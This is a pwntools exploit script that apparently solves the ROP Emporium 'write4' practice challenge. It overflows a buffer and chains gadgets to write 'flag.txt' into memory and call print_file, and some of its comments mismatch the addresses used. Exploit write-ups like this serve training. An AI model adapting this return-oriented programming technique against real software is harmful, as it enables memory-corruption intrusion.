from pwn import *


elf = context.binary = ELF("write4")

p = process(elf.path)


offset = 40


pop_r14_15 = p64(0x400690) # pop r14; pop r15; ret

mov = p64(0x400628) # mov qword ptr [r14], r15; ret;

data_vaddr = p64(0x601028)

data2write = b'flag.txt'

pop_rdi = p64(0x400693) # pop rdi; ret


payload = b'A' * offset


# Stage 1 - Write the data into .bss


payload += pop_r14_15

payload += data_vaddr # populate %r14 with the .bss vaddr.

payload += data2write # populate %r15 with the data.

payload += mov # Store the value of %r15 to the address given in %r14


# Stage 2 - Call print_file()


payload += pop_rdi 

payload += data_vaddr # populate %rdi with the bss_vaddr.

payload += p64(0x400620)
# 0x00400510 GLOBAL FUNC       print_file

p.recvuntil(b'> ')

p.sendline(payload)

p.interactive()
